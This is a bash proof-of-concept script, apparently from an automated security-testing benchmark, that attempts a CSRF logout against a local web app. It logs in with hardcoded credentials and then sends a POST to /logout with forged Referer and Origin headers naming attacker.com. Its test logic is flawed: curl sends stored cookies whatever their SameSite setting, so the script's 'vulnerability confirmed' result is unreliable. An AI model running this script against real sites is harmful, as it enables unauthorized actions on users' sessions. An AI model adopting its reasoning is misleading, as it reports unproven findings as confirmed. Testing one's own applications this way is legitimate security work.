#!/bin/bash
# POC: Demonstrates CSRF attack due to missing SameSite flag on session cookie. The POC simulates an attacker's website performing unauthorized actions (logout) on behalf of an authenticated user.
# Target: ./repo
# Created: 2025-11-04T17:38:37.799Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# CSRF Attack POC - Missing SameSite Cookie Flag
# This demonstrates how the missing SameSite flag allows unauthorized cross-site requests

TARGET_URL="http://localhost:8080"
CSRF_REFERER="http://attacker.com/csrf"

echo "[*] CSRF Attack POC - Testing Missing SameSite Flag"
echo "[*] Target: $TARGET_URL"
echo "[*] Attack Origin: $CSRF_REFERER"
echo ""

# Step 1: Authenticate as a legitimate user
echo "[+] Step 1: Authenticating as legitimate user..."
LOGIN_RESPONSE=$(curl -s -c /tmp/csrf_cookies.txt -b /tmp/csrf_cookies.txt \
  -X POST \
  "$TARGET_URL/password/admin" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "password=admin123&user_id=1")

echo "[+] Login response received"

# Step 2: Verify we have a session cookie
echo "[+] Step 2: Checking for session cookie..."
SESSION_COOKIE=$(grep -oP '(?<=session=)[^;]*' /tmp/csrf_cookies.txt | head -1)
if [ -z "$SESSION_COOKIE" ]; then
    echo "[-] No session cookie found. Trying alternative login..."
    # Try with different credentials
    curl -s -c /tmp/csrf_cookies.txt -b /tmp/csrf_cookies.txt \
      -X POST \
      "$TARGET_URL/password/testuser" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "password=test&user_id=10032" > /dev/null
    SESSION_COOKIE=$(grep -oP '(?<=session=)[^;]*' /tmp/csrf_cookies.txt | head -1)
fi

if [ -n "$SESSION_COOKIE" ]; then
    echo "[+] Session cookie found: ${SESSION_COOKIE:0:20}..."
else
    echo "[-] Could not obtain session cookie"
fi

echo ""
echo "[+] Step 3: Performing CSRF attack - Logout from attacker origin..."
echo "[*] Simulating cross-site request with Referer: $CSRF_REFERER"
echo ""

# Step 3: Perform CSRF action (logout) from attacker's origin
# The session cookie should still be sent because it lacks SameSite flag
CSRF_RESPONSE=$(curl -s -i -b /tmp/csrf_cookies.txt \
  -X POST \
  "$TARGET_URL/logout" \
  -H "Referer: $CSRF_REFERER" \
  -H "Origin: http://attacker.com" 2>&1)

echo "$CSRF_RESPONSE" | head -20

echo ""
echo "[+] Analysis:"
echo ""

# Check response status
if echo "$CSRF_RESPONSE" | grep -q "302\|301\|200"; then
    echo "[!] VULNERABILITY CONFIRMED: Cross-site logout request was ACCEPTED"
    echo "[!] The session cookie was sent with the cross-site request"
    echo "[!] This indicates missing SameSite flag - cookie was transmitted cross-site"
else
    echo "[-] Request was rejected or redirected unexpectedly"
fi

# Check for Set-Cookie header to see if session was cleared
if echo "$CSRF_RESPONSE" | grep -qi "set-cookie.*session"; then
    SESSION_HEADER=$(echo "$CSRF_RESPONSE" | grep -i "^set-cookie.*session")
    echo ""
    echo "[+] Session Cookie Response Header:"
    echo "    $SESSION_HEADER"
    echo ""
    
    if ! echo "$SESSION_HEADER" | grep -qi "samesite"; then
        echo "[!] MISSING SAMESITE FLAG CONFIRMED in response"
    fi
fi

# Step 4: Verify the session was actually cleared (CSRF succeeded)
echo ""
echo "[+] Step 4: Verifying CSRF attack success by checking if session is cleared..."
VERIFY_RESPONSE=$(curl -s -i -b /tmp/csrf_cookies.txt "$TARGET_URL/" 2>&1)

if echo "$VERIFY_RESPONSE" | grep -q "302\|redirect\|login"; then
    echo "[!] CSRF ATTACK SUCCESSFUL: User was logged out via cross-site request"
    echo "[!] This confirms the missing SameSite flag allowed the CSRF attack to work"
elif echo "$VERIFY_RESPONSE" | grep -q "200"; then
    echo "[*] Session still appears active - checking response body..."
    if echo "$VERIFY_RESPONSE" | grep -q "dashboard\|logout"; then
        echo "[*] User still authenticated - CSRF may not have succeeded"
    fi
fi

echo ""
echo "[+] POC Complete"
echo "[+] Finding: Session cookie lacks SameSite flag, allowing CSRF attacks"
echo "[+] Recommendation: Add 'SameSite=Strict' or 'SameSite=Lax' to session cookie"

# Cleanup
rm -f /tmp/csrf_cookies.txt